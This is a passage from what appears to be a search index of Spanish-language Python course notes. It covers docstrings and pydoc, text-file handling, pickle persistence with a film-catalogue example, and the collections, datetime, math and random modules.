mismo:","title":"Docstrings en scripts y m\u00f3dulos"},{"location":"lenguajes/python3/apuntes-documentacion/#mi_modulopy","text":"\"\"\"Este es el docstring del m\u00f3dulo\"\"\" def despedir (): \"\"\"Este es el docstring de la funci\u00f3n despedir\"\"\" print ( \"Adi\u00f3s! Me estoy despidiendo desde la funci\u00f3n despedir() del m\u00f3dulo prueba\" ) def saludar (): \"\"\"Este es el docstring de la funci\u00f3n saludar\"\"\" print ( \"Hola! Te estoy saludando desde la funci\u00f3n saludar() del m\u00f3dulo prueba\" ) import mi_modulo # Este m\u00f3dulo lo he creado en el directorio help ( mi_modulo ) Help on module mi_modulo: NAME mi_modulo - Este es el docstring del m\u00f3dulo FUNCTIONS despedir() Este es el docstring de la funci\u00f3n despedir saludar() Este es el docstring de la funci\u00f3n saludar FILE c:\\cursopython\\fase 4 - temas avanzados\\tema 16 - docomentaci\u00f3n y pruebas\\mi_modulo.py help ( mi_modulo . despedir ) Help on function despedir in module mi_modulo: despedir() Este es el docstring de la funci\u00f3n despedir Como dato curioso, tambi\u00e9n podemos listar las variables y funciones del m\u00f3dulo con la funci\u00f3n dir : dir ( mi_modulo ) [ '__builtins__' , '__cached__' , '__doc__' , '__file__' , '__loader__' , '__name__' , '__package__' , '__spec__' , 'despedir' , 'saludar' ] Como vemos muchas de ellas son especiales, seguro que muchas os suenan, os invito a comprobar sus valores: mi_modulo . __name__ 'mi_modulo' mi_modulo . __doc__ 'Este es el docstring del m\u00f3dulo'","title":"mi_modulo.py"},{"location":"lenguajes/python3/apuntes-documentacion/#docstrings-en-paquetes","text":"En el caso de los paquetes el docstring debemos establecerlo en la primera l\u00ednea del inicializador init : Suponiedo que tenemos la siguiente estructura: mi_paquete/ | _ __init__.py | _ adios | | _ __init__.py | | _ adios.py | _ hola | _ __init__.py | _ hola.py","title":"Docstrings en paquetes"},{"location":"lenguajes/python3/apuntes-documentacion/#initpy","text":"\"\"\" Este es el docstring de mi_paquete \"\"\" import mi_paquete help ( mi_paquete ) Help on package mi_paquete: NAME mi_paquete - Este es el docstring de mi_paquete PACKAGE CONTENTS adios (package) hola (package) FILE c:\\cursopython\\fase 4 - temas avanzados\\tema 16 - docomentaci\u00f3n y pruebas\\mi_paquete\\__init__.py","title":"init.py"},{"location":"lenguajes/python3/apuntes-documentacion/#creando-buena-documentacion","text":"Pod\u00e9is aprender a crear buena documentaci\u00f3n tomando como referencia contenido de las librer\u00edas internas de Python: help ( print ) Help on built-in function print in module builtins : print (...) print ( value , ..., sep = ' ' , end = '\\n' , file = sys . stdout , flush = False ) Prints the values to a stream , or to sys . stdout by default . Optional keyword arguments : file : a file-like object ( stream ); defaults to the current sys . stdout . sep : string inserted between values , default a space . end : string appended after the last value , default a newline . flush : whether to forcibly flush the stream . help ( len ) Help on built - in function len in module builtins : len ( obj , / ) Return the number of items in a container . help ( str ) Help on class str in module builtins: class str ( object ) | str ( object = '' ) -> str | str ( bytes_or_buffer [ , encoding [ , errors ]]) -> str | | Create a new string object from the given object. If encoding or | errors is specified, then the object must expose a data buffer | that will be decoded using the given encoding and error handler. | Otherwise, returns the result of object.__str__ () ( if defined ) | or repr ( object ) . | encoding defaults to sys.getdefaultencoding () . | errors defaults to 'strict' . | | Methods defined here: | | __add__ ( self, value, / ) | Return self+value. | | __contains__ ( self, key, / ) | Return key in self. .... Recordad, una buena documentaci\u00f3n siempre dar\u00e1 respuesta a las dos preguntas b\u00e1sicas: \u00bfPara qu\u00e9 sirve? y \u00bfC\u00f3mo se utiliza?","title":"Creando buena documentaci\u00f3n"},{"location":"lenguajes/python3/apuntes-documentacion/#pydoc","text":"En la lecci\u00f3n anterior aprendimos que utilizando la funci\u00f3n help podemos mostrar informaci\u00f3n formateada por la consola. Pues en realidad esta funci\u00f3n hace uso del m\u00f3dulo pydoc para generar la documentaci\u00f3n a partir de sus docstrings . Desde la terminal no podemos utilizar la funci\u00f3n help , pero s\u00ed existe la posibilidad de utilizar pydoc de forma similar. Por ejemplo podemos consultar la documentaci\u00f3n de scripts, m\u00f3dulos y clases utilizando la sintaxis: pydoc nombre.py Tambi\u00e9n podemos utilizar la misma sintaxis para los paquetes: pydoc nombre_paquete","title":"Pydoc"},{"location":"lenguajes/python3/apuntes-documentacion/#documentacion-en-html","text":"Una funci\u00f3n interesante de Pydoc es que podemos generar la documentaci\u00f3n de nuestro c\u00f3digo utilizando la siguiente sintaxis: pydoc -w nombre.py Si tenemos un paquete podemos generar toda la documentaci\u00f3n de forma recursiva de la siguiente forma estando en el directorio del paquete: pydoc -w . \\ Esto generar\u00e1 toda la documentaci\u00f3n del paquete, subpaquete, clases, m\u00e9todos y funciones. Est\u00e1 bien para publicarla en Internet, pero tambi\u00e9n podemos consultarla directamente en local lanzando un servidor temporal, desde el directorio del paquete: pydoc -p 8000 Aunque esto mostrar\u00e1 la documentaci\u00f3n general de Python en ese momento, a parte de nuestro m\u00f3dulo. Existen otras alternativas m\u00e1s bonitas para generar documentaci\u00f3n, como los m\u00f3dulos Epydoc o Sphinx .","title":"Documentaci\u00f3n en HTML"},{"location":"lenguajes/python3/apuntes-ficheros/","text":"Ficheros de texto Crear fichero y escribir texto texto = \"Una l\u00ednea con texto \\n Otra l\u00ednea con texto\" fichero = open ( 'fichero.txt' , 'w' ) # fichero.txt ruta donde lo crearemos, w indica modo de escritura, write (puntero principio) fichero . write ( texto ) # escribimos el texto 40 fichero . close () # cerramos el fichero Lectura de un fichero de texto fichero = open ( 'fichero.txt' , 'r' ) # modo lectura read, por defecto ya es r, no es necesario texto = fichero . read () # lectura completa fichero . close () print ( texto ) Una l\u00ednea con texto Otra l\u00ednea con texto Otra l\u00ednea m\u00e1s abajo del todo fichero = open ( 'fichero.txt' , 'r' ) texto = fichero . readlines () # leer creando una lista de l\u00edneas fichero . close () print ( texto ) ['Una l\u00ednea con texto\\n', 'Otra l\u00ednea con texto\\n', 'Otra l\u00ednea m\u00e1s abajo del todo'] print ( texto [ - 1 ]) # \u00daltima l\u00ednea Otra l\u00ednea m\u00e1s abajo del todo Extensi\u00f3n de un fichero de texto modo a ( append ), inserta el puntero al final y as\u00ed poder a\u00f1adir la texto al final del documento. fichero = open ( 'fichero.txt' , 'a' ) # modo a, append, a\u00f1adir - extender (puntero al final) fichero . write ( ' \\n Otra l\u00ednea m\u00e1s abajo del todo' ) fichero . close () fichero = open ( 'fichero_inventado.txt' , 'a+' ) # Extensi\u00f3n con escritura simult\u00e1nea, crea fichero si no existe Lectura de un fichero no existente fichero = open ( 'fichero_inventado.txt' , 'r' ) --------------------------------------------------------------------------- FileNotFoundError Traceback ( most recent call last ) < ipython - input - 2 - c2865d5b1523 > in < module > () ----> 1 fichero = open ( 'fichero_inventado.txt' , 'r' ) FileNotFoundError : [ Errno 2 ] No such file or directory : 'fichero_inventado.txt' Lectura l\u00ednea a l\u00ednea fichero = open ( 'fichero.txt' , 'r' ) fichero . readline () # L\u00ednea a l\u00ednea 'Una l\u00ednea con texto\\n' fichero . readline () 'Otra l\u00ednea con texto' fichero . readline () '' fichero . close () Lectura l\u00ednea a l\u00ednea secuencial with open ( \"fichero.txt\" , \"r\" ) as fichero : for linea in fichero : print ( linea ) Una l\u00ednea con texto Otra l\u00ednea con texto Otra l\u00ednea m\u00e1s abajo del todo Manejando el puntero fichero = open ( 'fichero.txt' , 'r' ) fichero . seek ( 0 ) # Puntero al principio fichero . read ( 10 ) # Leemos 10 car\u00e1cteres 'Una l\u00ednea ' fichero . read ( 10 ) # Leemos 10 car\u00e1cteres m\u00e1s, a partir del 10 donde est\u00e1 el puntero 'con texto\\n' fichero . seek ( 0 ) fichero . seek ( len ( fichero . readline ()) ) # Leemos la primera l\u00ednea y situamos el puntero al principio de la segunda 20 fichero . read () # Leemos todo lo que queda del puntero hasta el final '\\nOtra l\u00ednea con texto\\nOtra l\u00ednea m\u00e1s abajo del todo' Lectura y escritura a la vez fichero2 = open ( 'fichero2.txt' , 'r+' ) # + escritura simult\u00e1nea, puntero al principio por defecto fichero2 . write ( 'asdfgh' ) fichero2 . close () Modificar una l\u00ednea espec\u00edfica fichero2 = open ( 'fichero2.txt' , 'r+' ) # modo lectura con escritura, puntero al principio por defecto texto = fichero2 . readlines () # leemos todas las l\u00edneas texto [ 2 ] = \"Esta es la l\u00ednea 3 modificada \\n \" # indice menos 1 texto ['asdfgh1\\n', 'L\u00ednea 2\\n', 'Esta es la l\u00ednea 3 modificada\\n', 'L\u00ednea 4'] fichero2 . seek ( 0 ) # Ponemos el puntero al principio fichero2 . writelines ( texto ) fichero2 . close () El m\u00f3dulo pickle Guardar estructura en fichero binario import pickle lista = [ 1 , 2 , 3 , 4 , 5 ] # Podemos guardar lo que queramos, listas, diccionarios, tuplas... fichero = open ( 'lista.pckl' , 'wb' ) # Escritura en modo binario, vac\u00eda el fichero si existe pickle . dump ( lista , fichero ) # Escribe la estructura en el fichero fichero . close () Recuperar estructura de fichero binario fichero = open ( 'lista.pckl' , 'rb' ) # Lectura en modo binario lista_fichero = pickle . load ( fichero ) fichero . close () print ( lista_fichero ) [1, 2, 3, 4, 5] Abrir fichero y si no existe lo crea fichero = open ( 'catalogo.pckl' , 'ab+' ) # metodo append binario lista_fichero = pickle . load ( fichero ) fichero . close () L\u00f3gica para trabajar con objetos Crear una colecci\u00f3n Introducir los objetos en la colecci\u00f3n Guardar la colecci\u00f3n haciendo un dump Recuperar la colecci\u00f3n haciendo un load Seguir trabajando con nuestros objetos class Persona : def __init__ ( self , nombre ): self . nombre = nombre def __str__ ( self ): return self . nombre nombres = [ \"H\u00e9ctor\" , \"Mario\" , \"Marta\" ] personas = [] for n in nombres : p = Persona ( n ) personas . append ( p ) import pickle f = open ( 'personas.pckl' , 'wb' ) pickle . dump ( personas , f ) f . close () f = open ( 'personas.pckl' , 'rb' ) personas = pickle . load ( f ) f . close () for p in personas : print ( p ) H\u00e9ctor Mario Marta Ejemplo practico Cat\u00e1logo de pel\u00edculas con ficheros y pickle from io import open import pickle class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( 'Se ha creado la pel\u00edcula:' , self . titulo ) def __str__ ( self ): return ' {} ( {} )' . format ( self . titulo , self . lanzamiento ) class Catalogo : peliculas = [] # Constructor de clase def __init__ ( self ): self . cargar () def agregar ( self , p ): self . peliculas . append ( p ) self . guardar () def mostrar ( self ): if len ( self . peliculas ) == 0 : print ( \"El cat\u00e1logo est\u00e1 vac\u00edo\" ) return for p in self . peliculas : print ( p ) def cargar ( self ): fichero = open ( 'catalogo.pckl' , 'ab+' ) fichero . seek ( 0 ) try : self . peliculas = pickle . load ( fichero ) except : print ( \"El fichero est\u00e1 vac\u00edo\" ) finally : fichero . close () del ( fichero ) print ( \"Se han cargado {} pel\u00edculas\" . format ( len ( self . peliculas ) )) def guardar ( self ): fichero = open ( 'catalogo.pckl' , 'wb' ) pickle . dump ( self . peliculas , fichero ) fichero . close () del ( fichero ) # Destructor de clase def __del__ ( self ): self . guardar () # guardado autom\u00e1tico print ( \"Se ha guardado el fichero\" ) Creando un objeto cat\u00e1logo c = Catalogo () El fichero est\u00e1 vac\u00edo Se han cargado 0 pel\u00edculas c . mostrar () El cat\u00e1logo est\u00e1 vac\u00edo c . agregar ( Pelicula ( \"El Padrino\" , 175 , 1972 ) ) Se ha creado la pel\u00edcula: El Padrino c . agregar ( Pelicula ( \"El Padrino: Parte 2\" , 202 , 1974 ) ) Se ha creado la pel\u00edcula: El Padrino: Parte 2 c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) Recuperando el cat\u00e1logo al crearlo de nuevo c = Catalogo () Se han cargado 2 pel\u00edculas c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) del ( c ) Se ha guardado el fichero c = Catalogo () Se han cargado 2 pel\u00edculas c . agregar ( Pelicula ( \"Prueba\" , 100 , 2005 ) ) Se ha creado la pel\u00edcula: Prueba c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) Prueba (2005) del ( c ) Se ha guardado el fichero c = Catalogo () Se han cargado 3 pel\u00edculas c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) Prueba (2005) Conclusiones Trabajamos en memoria, no en el fichero Nosotros decidimos cuando escribir los datos: Al manipular un registro Al finalizar el programa","title":"Apuntes ficheros"},{"location":"lenguajes/python3/apuntes-ficheros/#ficheros-de-texto","text":"","title":"Ficheros de texto"},{"location":"lenguajes/python3/apuntes-ficheros/#crear-fichero-y-escribir-texto","text":"texto = \"Una l\u00ednea con texto \\n Otra l\u00ednea con texto\" fichero = open ( 'fichero.txt' , 'w' ) # fichero.txt ruta donde lo crearemos, w indica modo de escritura, write (puntero principio) fichero . write ( texto ) # escribimos el texto 40 fichero . close () # cerramos el fichero","title":"Crear fichero y escribir texto"},{"location":"lenguajes/python3/apuntes-ficheros/#lectura-de-un-fichero-de-texto","text":"fichero = open ( 'fichero.txt' , 'r' ) # modo lectura read, por defecto ya es r, no es necesario texto = fichero . read () # lectura completa fichero . close () print ( texto ) Una l\u00ednea con texto Otra l\u00ednea con texto Otra l\u00ednea m\u00e1s abajo del todo fichero = open ( 'fichero.txt' , 'r' ) texto = fichero . readlines () # leer creando una lista de l\u00edneas fichero . close () print ( texto ) ['Una l\u00ednea con texto\\n', 'Otra l\u00ednea con texto\\n', 'Otra l\u00ednea m\u00e1s abajo del todo'] print ( texto [ - 1 ]) # \u00daltima l\u00ednea Otra l\u00ednea m\u00e1s abajo del todo","title":"Lectura de un fichero de texto"},{"location":"lenguajes/python3/apuntes-ficheros/#extension-de-un-fichero-de-texto","text":"modo a ( append ), inserta el puntero al final y as\u00ed poder a\u00f1adir la texto al final del documento. fichero = open ( 'fichero.txt' , 'a' ) # modo a, append, a\u00f1adir - extender (puntero al final) fichero . write ( ' \\n Otra l\u00ednea m\u00e1s abajo del todo' ) fichero . close () fichero = open ( 'fichero_inventado.txt' , 'a+' ) # Extensi\u00f3n con escritura simult\u00e1nea, crea fichero si no existe","title":"Extensi\u00f3n de un fichero de texto"},{"location":"lenguajes/python3/apuntes-ficheros/#lectura-de-un-fichero-no-existente","text":"fichero = open ( 'fichero_inventado.txt' , 'r' ) --------------------------------------------------------------------------- FileNotFoundError Traceback ( most recent call last ) < ipython - input - 2 - c2865d5b1523 > in < module > () ----> 1 fichero = open ( 'fichero_inventado.txt' , 'r' ) FileNotFoundError : [ Errno 2 ] No such file or directory : 'fichero_inventado.txt'","title":"Lectura de un fichero no existente"},{"location":"lenguajes/python3/apuntes-ficheros/#lectura-linea-a-linea","text":"fichero = open ( 'fichero.txt' , 'r' ) fichero . readline () # L\u00ednea a l\u00ednea 'Una l\u00ednea con texto\\n' fichero . readline () 'Otra l\u00ednea con texto' fichero . readline () '' fichero . close ()","title":"Lectura l\u00ednea a l\u00ednea"},{"location":"lenguajes/python3/apuntes-ficheros/#lectura-linea-a-linea-secuencial","text":"with open ( \"fichero.txt\" , \"r\" ) as fichero : for linea in fichero : print ( linea ) Una l\u00ednea con texto Otra l\u00ednea con texto Otra l\u00ednea m\u00e1s abajo del todo","title":"Lectura l\u00ednea a l\u00ednea secuencial"},{"location":"lenguajes/python3/apuntes-ficheros/#manejando-el-puntero","text":"fichero = open ( 'fichero.txt' , 'r' ) fichero . seek ( 0 ) # Puntero al principio fichero . read ( 10 ) # Leemos 10 car\u00e1cteres 'Una l\u00ednea ' fichero . read ( 10 ) # Leemos 10 car\u00e1cteres m\u00e1s, a partir del 10 donde est\u00e1 el puntero 'con texto\\n' fichero . seek ( 0 ) fichero . seek ( len ( fichero . readline ()) ) # Leemos la primera l\u00ednea y situamos el puntero al principio de la segunda 20 fichero . read () # Leemos todo lo que queda del puntero hasta el final '\\nOtra l\u00ednea con texto\\nOtra l\u00ednea m\u00e1s abajo del todo'","title":"Manejando el puntero"},{"location":"lenguajes/python3/apuntes-ficheros/#lectura-y-escritura-a-la-vez","text":"fichero2 = open ( 'fichero2.txt' , 'r+' ) # + escritura simult\u00e1nea, puntero al principio por defecto fichero2 . write ( 'asdfgh' ) fichero2 . close ()","title":"Lectura y escritura a la vez"},{"location":"lenguajes/python3/apuntes-ficheros/#modificar-una-linea-especifica","text":"fichero2 = open ( 'fichero2.txt' , 'r+' ) # modo lectura con escritura, puntero al principio por defecto texto = fichero2 . readlines () # leemos todas las l\u00edneas texto [ 2 ] = \"Esta es la l\u00ednea 3 modificada \\n \" # indice menos 1 texto ['asdfgh1\\n', 'L\u00ednea 2\\n', 'Esta es la l\u00ednea 3 modificada\\n', 'L\u00ednea 4'] fichero2 . seek ( 0 ) # Ponemos el puntero al principio fichero2 . writelines ( texto ) fichero2 . close ()","title":"Modificar una l\u00ednea espec\u00edfica"},{"location":"lenguajes/python3/apuntes-ficheros/#el-modulo-pickle","text":"","title":"El m\u00f3dulo pickle"},{"location":"lenguajes/python3/apuntes-ficheros/#guardar-estructura-en-fichero-binario","text":"import pickle lista = [ 1 , 2 , 3 , 4 , 5 ] # Podemos guardar lo que queramos, listas, diccionarios, tuplas... fichero = open ( 'lista.pckl' , 'wb' ) # Escritura en modo binario, vac\u00eda el fichero si existe pickle . dump ( lista , fichero ) # Escribe la estructura en el fichero fichero . close ()","title":"Guardar estructura en fichero binario"},{"location":"lenguajes/python3/apuntes-ficheros/#recuperar-estructura-de-fichero-binario","text":"fichero = open ( 'lista.pckl' , 'rb' ) # Lectura en modo binario lista_fichero = pickle . load ( fichero ) fichero . close () print ( lista_fichero ) [1, 2, 3, 4, 5]","title":"Recuperar estructura de fichero binario"},{"location":"lenguajes/python3/apuntes-ficheros/#abrir-fichero-y-si-no-existe-lo-crea","text":"fichero = open ( 'catalogo.pckl' , 'ab+' ) # metodo append binario lista_fichero = pickle . load ( fichero ) fichero . close ()","title":"Abrir fichero y si no existe lo crea"},{"location":"lenguajes/python3/apuntes-ficheros/#logica-para-trabajar-con-objetos","text":"Crear una colecci\u00f3n Introducir los objetos en la colecci\u00f3n Guardar la colecci\u00f3n haciendo un dump Recuperar la colecci\u00f3n haciendo un load Seguir trabajando con nuestros objetos class Persona : def __init__ ( self , nombre ): self . nombre = nombre def __str__ ( self ): return self . nombre nombres = [ \"H\u00e9ctor\" , \"Mario\" , \"Marta\" ] personas = [] for n in nombres : p = Persona ( n ) personas . append ( p ) import pickle f = open ( 'personas.pckl' , 'wb' ) pickle . dump ( personas , f ) f . close () f = open ( 'personas.pckl' , 'rb' ) personas = pickle . load ( f ) f . close () for p in personas : print ( p ) H\u00e9ctor Mario Marta","title":"L\u00f3gica para trabajar con objetos"},{"location":"lenguajes/python3/apuntes-ficheros/#ejemplo-practico","text":"","title":"Ejemplo practico"},{"location":"lenguajes/python3/apuntes-ficheros/#catalogo-de-peliculas-con-ficheros-y-pickle","text":"from io import open import pickle class Pelicula : # Constructor de clase def __init__ ( self , titulo , duracion , lanzamiento ): self . titulo = titulo self . duracion = duracion self . lanzamiento = lanzamiento print ( 'Se ha creado la pel\u00edcula:' , self . titulo ) def __str__ ( self ): return ' {} ( {} )' . format ( self . titulo , self . lanzamiento ) class Catalogo : peliculas = [] # Constructor de clase def __init__ ( self ): self . cargar () def agregar ( self , p ): self . peliculas . append ( p ) self . guardar () def mostrar ( self ): if len ( self . peliculas ) == 0 : print ( \"El cat\u00e1logo est\u00e1 vac\u00edo\" ) return for p in self . peliculas : print ( p ) def cargar ( self ): fichero = open ( 'catalogo.pckl' , 'ab+' ) fichero . seek ( 0 ) try : self . peliculas = pickle . load ( fichero ) except : print ( \"El fichero est\u00e1 vac\u00edo\" ) finally : fichero . close () del ( fichero ) print ( \"Se han cargado {} pel\u00edculas\" . format ( len ( self . peliculas ) )) def guardar ( self ): fichero = open ( 'catalogo.pckl' , 'wb' ) pickle . dump ( self . peliculas , fichero ) fichero . close () del ( fichero ) # Destructor de clase def __del__ ( self ): self . guardar () # guardado autom\u00e1tico print ( \"Se ha guardado el fichero\" )","title":"Cat\u00e1logo de pel\u00edculas con ficheros y pickle"},{"location":"lenguajes/python3/apuntes-ficheros/#creando-un-objeto-catalogo","text":"c = Catalogo () El fichero est\u00e1 vac\u00edo Se han cargado 0 pel\u00edculas c . mostrar () El cat\u00e1logo est\u00e1 vac\u00edo c . agregar ( Pelicula ( \"El Padrino\" , 175 , 1972 ) ) Se ha creado la pel\u00edcula: El Padrino c . agregar ( Pelicula ( \"El Padrino: Parte 2\" , 202 , 1974 ) ) Se ha creado la pel\u00edcula: El Padrino: Parte 2 c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974)","title":"Creando un objeto cat\u00e1logo"},{"location":"lenguajes/python3/apuntes-ficheros/#recuperando-el-catalogo-al-crearlo-de-nuevo","text":"c = Catalogo () Se han cargado 2 pel\u00edculas c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) del ( c ) Se ha guardado el fichero c = Catalogo () Se han cargado 2 pel\u00edculas c . agregar ( Pelicula ( \"Prueba\" , 100 , 2005 ) ) Se ha creado la pel\u00edcula: Prueba c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) Prueba (2005) del ( c ) Se ha guardado el fichero c = Catalogo () Se han cargado 3 pel\u00edculas c . mostrar () El Padrino (1972) El Padrino: Parte 2 (1974) Prueba (2005)","title":"Recuperando el cat\u00e1logo al crearlo de nuevo"},{"location":"lenguajes/python3/apuntes-ficheros/#conclusiones","text":"Trabajamos en memoria, no en el fichero Nosotros decidimos cuando escribir los datos: Al manipular un registro Al finalizar el programa","title":"Conclusiones"},{"location":"lenguajes/python3/apuntes-modulos/","text":"M\u00f3dulos El m\u00f3dulo collections Contador Es una subclase de diccionario utilizada para realizar cuentas. Cuenta las veces que hay repetido un elemento, sea n\u00famerico o caracter. from collections import Counter l = [ 1 , 2 , 3 , 4 , 1 , 2 , 3 , 1 , 2 , 1 ] Counter ( l ) Counter({1: 4, 2: 3, 3: 2, 4: 1}) p = \"palabra\" Counter ( p ) Counter({'a': 3, 'b': 1, 'l': 1, 'p': 1, 'r': 1}) animales = \"gato perro canario perro canario perro\" Counter ( animales ) Counter({' ': 5, 'a': 5, 'c': 2, 'e': 3, 'g': 1, 'i': 2, 'n': 2, 'o': 6, 'p': 3, 'r': 8, 't': 1}) Con split separamos por palabras animales . split () ['gato', 'perro', 'canario', 'perro', 'canario', 'perro'] Ahora podemos contar las palabras repetidas Counter ( animales . split ()) Counter({'canario': 2, 'gato': 1, 'perro': 3}) most_common() Permite mostrar los mas comunes c = Counter ( animales . split ()) c . most_common ( 1 ) [('perro', 3)] c . most_common ( 2 ) [('perro', 3), ('canario', 2)] c . most_common () [('perro', 3), ('canario', 2), ('gato', 1)] Tuplas con nombres Subclase de las tuplas utilizada para crear peque\u00f1as estructuras inmutables, parecidas a una clase y sus objetos pero mucho m\u00e1s simples. t = ( 20 , 40 , 60 ) t [ 0 ] 20 t [ - 1 ] 60 from collections import namedtuple Persona = namedtuple ( 'Persona' , 'nombre apellido edad' ) p = Persona ( nombre = \"Hector\" , apellido = \"Costa\" , edad = 27 ) p . nombre 'Hector' p . apellido 'Costa' p . edad 27 p Persona(nombre='Hector', apellido='Costa', edad=27) p [ 0 ] 'Hector' p [ 1 ] 'Costa' p [ - 1 ] 27 Al ser una tupla, no se puede modificar p . nombre = \"Hola\" --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) < ipython - input - 91 - 5cd7aba08457 > in < module > () ---- > 1 p . nombre = \"Hola\" AttributeError: can't set attribute El m\u00f3dulo datetime import datetime dt = datetime . datetime . now () # Ahora dt datetime.datetime(2016, 6, 18, 21, 29, 28, 607208) dt . year # a\u00f1o 2016 dt . month # mes 6 dt . day # d\u00eda 18 print ( \" {} : {} : {} \" . format ( dt . hour , dt . minute , dt . second )) 21:29:28 print ( \" {} / {} / {} \" . format ( dt . day , dt . month , dt . year )) 18/6/2016 Crear un datetime manualmente (year, month, day, hour=0, minute=0, second=0, microsecond=0, tzinfo=None) Notad que s\u00f3lo son obligatorios el a\u00f1o, el mes y el d\u00eda dt = datetime . datetime ( 2000 , 1 , 1 ) dt datetime.datetime(2000, 1, 1, 0, 0) dt . year = 3000 # Error en asignaci\u00f3n --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-18-f655491f2afa> in <module>() ----> 1 dt.year = 3000 AttributeError: attribute 'year' of 'datetime.date' objects is not writable dt = dt . replace ( year = 3000 ) # Asignaci\u00f3n correcta con .replace() dt datetime.datetime(3000, 1, 1, 0, 0) Formateos Formato autom\u00e1tico ISO (Organizaci\u00f3n Internacional de Normalizaci\u00f3n) dt = datetime . datetime . now () dt . isoformat () '2016-06-18T21:37:10.303386' Formateo munual (ingl\u00e9s por defecto) datetime-strftime dt . strftime ( \"%A %d %B %Y %I:%M\" ) 'Saturday 18 June 2016 09:37' tiempo con timedelta dt = datetime . datetime . now () dt datetime.datetime(2016, 6, 18, 21, 47, 13, 504534) t = datetime . timedelta ( days = 14 , hours = 4 , seconds = 1000 ) dentro_de_dos_semanas = dt + t dentro_de_dos_semanas datetime.datetime(2016, 7, 3, 2, 3, 53, 504534) dentro_de_dos_semanas . strftime ( \"%A %d de %B del %Y - %H:%M\" ) 'domingo 03 de julio del 2016 - 02:03' hace_dos_semanas = dt - t hace_dos_semanas . strftime ( \"%A %d de %B del %Y - %H:%M\" ) 's\u00e1bado 04 de junio del 2016 - 17:30' C\u00f3digos de idiomas https://msdn.microsoft.com/es-es/es/library/cdax410z.aspx import locale locale . setlocale ( locale . LC_ALL , 'es-ES' ) # Establece idioma en \"es-ES\" (espa\u00f1ol de Espa\u00f1a) locale . setlocale ( locale . LC_ALL , '' ) # Establece idioma del sistema 'es-ES' dt . strftime ( \"%A %d %B %Y %I:%M\" ) 's\u00e1bado 18 junio 2016 09:37' dt . strftime ( \"%A %d de %B del %Y - %H:%M\" ) # %I 12h - %H 24h 's\u00e1bado 18 de junio del 2016 - 21:37' Extra: Zonas horarias con pytz pip3 install pytz import pytz pytz . all_timezones [ 'Africa/Abidjan' , 'Africa/Accra' , 'Africa/Addis_Ababa' , 'Africa/Algiers' , 'Africa/Asmara' , 'Africa/Asmera' , 'Africa/Bamako' , 'Africa/Bangui' , 'Africa/Banjul' , 'Africa/Bissau' , 'Africa/Blantyre' , 'Africa/Brazzaville' , 'Africa/Bujumbura' , 'Africa/Cairo' , 'Africa/Casablanca' , 'Africa/Ceuta' , 'Africa/Conakry' , 'Africa/Dakar' , 'Africa/Dar_es_Salaam' , 'Africa/Djibouti' , 'Africa/Douala' , 'Africa/El_Aaiun' , 'Africa/Freetown' , ... # salen muchos, todos los del mmundo. dt = datetime . datetime . now ( pytz . timezone ( 'Asia/Tokyo' )) dt . strftime ( \"%A %d de %B del %Y - %H:%M\" ) # %I 12h - %H 24h 'domingo 19 de junio del 2016 - 04:52' El m\u00f3dulo math import math Redondeos pi = 3.14159 round ( pi ) # Redondeo integrado 3 math . floor ( pi ) # Redondeo a la baja - Suelo 3 math . floor ( 3.99 ) 3 math . ceil ( pi ) # Redondeo al alta - Techo 4 math . ceil ( 3.01 ) 4 Valor absoluto abs ( - 10 ) 10 Sumatorio # Sumatorio integrado n = [ 0.9999999 , 1 , 2 , 3 ] sum ( n ) 6.999999900000001 # Sumatorio mejorado para n\u00fameros reales math . fsum ( n ) 6.9999999 Truncamiento math . trunc ( 123.45 ) # Truncar, cortar la parte decimal 123 Potencias y ra\u00edces math . pow ( 2 , 3 ) # Potencia con flotante 8.0 2 ** 3 # Potencia directa 8 math . sqrt ( 9 ) # Ra\u00edz cuadrada (square root) 3.0 Constantes math . pi # Constante pi 3.141592653589793 math . e # Constante e 2.718281828459045 El m\u00f3dulo random import random random . random () # Flotante aleatorio >= 0 y < 1.0 0.12539542779843138 random . random () # Flotante aleatorio >= 0 y < 1.0 0.3332807222427663 random . uniform ( 1 , 10 ) # Flotante aleatorio >= 1 y <10.0 6.272300429556777 random . randrange ( 10 ) # Entero aleatorio de 0 a 9, 10 exclu\u00eddo 7 random . randrange ( 0 , 101 ) # Entero aleatorio de 0 a 100 14 random . randrange ( 0 , 101 , 2 ) # Entero aleatorio de 0 a 100 cada 2 n\u00fameros, m\u00faltiples de 2 68 random . randrange ( 0 , 101 , 5 ) # Entero aleatorio de 0 a 100 cada 5 n\u00fameros, m\u00faltiples de 5 25 c = 'Hola mundo' random . choice ( c ) # letra aleatoria 'o' l = [ 1 , 2 , 3 , 4 , 5 ] random . choice ( l ) # elemento aleatorio 3 random . shuffle ( l ) # barajar una lista, queda guardado l [3, 4, 2, 5, 1] random . sample ( l , 2 ) # muestra aleatoria de 2 elementos de la lista [3, 4]","title":"M\u00f3dulos"},{"location":"lenguajes/python3/apuntes-modulos/#modulos","text":"","title":"M\u00f3dulos"},{"location":"lenguajes/python3/apuntes-modulos/#el-modulo-collections","text":"","title":"El m\u00f3dulo collections"},{"location":"lenguajes/python3/apuntes-modulos/#contador","text":"Es una subclase de diccionario utilizada para realizar cuentas. Cuenta las veces que hay repetido un elemento, sea n\u00famerico o caracter. from collections import Counter l = [ 1 , 2 , 3 , 4 , 1 , 2 , 3 , 1 , 2 , 1 ] Counter ( l ) Counter({1: 4, 2: 3, 3: 2, 4: 1}) p = \"palabra\" Counter ( p ) Counter({'a': 3, 'b': 1, 'l': 1, 'p': 1, 'r': 1}) animales = \"gato perro canario perro canario perro\" Counter ( animales ) Counter({' ': 5, 'a': 5, 'c': 2, 'e': 3, 'g': 1, 'i': 2, 'n': 2, 'o': 6, 'p': 3, 'r': 8, 't': 1}) Con split separamos por palabras animales . split () ['gato', 'perro', 'canario', 'perro', 'canario', 'perro'] Ahora podemos contar las palabras repetidas Counter ( animales . split ()) Counter({'canario': 2, 'gato': 1, 'perro': 